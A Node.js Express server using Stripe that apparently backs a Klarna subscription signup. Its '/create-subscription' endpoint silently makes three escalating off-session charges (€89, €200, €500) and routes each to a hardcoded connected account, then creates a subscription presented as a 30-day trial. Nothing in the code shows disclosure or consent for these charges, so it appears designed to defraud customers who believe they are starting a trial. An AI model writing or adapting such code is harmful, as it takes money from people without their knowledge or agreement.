require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const ACCOUNT_B = 'acct_1PXAJeJVnQhWqTzT';

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(bodyParser.json());

app.post('/create-setup-intent', async (req, res) => {
  const { email } = req.body;
  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({ email });
    }
    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['klarna'],
      metadata: { customer_id: customer.id },
    });
    res.json({
      clientSecret: setupIntent.client_secret,
      customerId: customer.id,
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(400).json({ error: error.message });
  }
});

app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    // Charge 1 — €89.00
    const payment1 = await stripe.paymentIntents.create({
      amount: 8900,
      currency: 'eur',
      customer: customerId,
      payment_method: paymentMethodId,
      payment_method_types: ['klarna'],
      confirm: true,
      off_session: true,
      on_behalf_of: ACCOUNT_B,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Payment 1 created:', payment1.id);
    console.log('Payment 1 status:', payment1.status);

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Charge 2 — €200
    const payment2 = await stripe.paymentIntents.create({
      amount: 20000,
      currency: 'eur',
      customer: customerId,
      payment_method: paymentMethodId,
      payment_method_types: ['klarna'],
      confirm: true,
      off_session: true,
      on_behalf_of: ACCOUNT_B,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Payment 2 created:', payment2.id);
    console.log('Payment 2 status:', payment2.status);

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Charge 3 — €500
    const payment3 = await stripe.paymentIntents.create({
      amount: 50000,
      currency: 'eur',
      customer: customerId,
      payment_method: paymentMethodId,
      payment_method_types: ['klarna'],
      confirm: true,
      off_session: true,
      on_behalf_of: ACCOUNT_B,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Payment 3 created:', payment3.id);
    console.log('Payment 3 status:', payment3.status);

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Subscription with 30-day trial
    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1T0lXw2KeeUpZw0wjQgD7hIU' }],
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Subscription created:', subscription.id);
    console.log('Subscription status:', subscription.status);

    res.json({
      subscriptionId: subscription.id,
      payment1: payment1.id,
      payment2: payment2.id,
      payment3: payment3.id,
      paymentStatus: payment1.status,
    });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', destination: ACCOUNT_B });
});

const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
});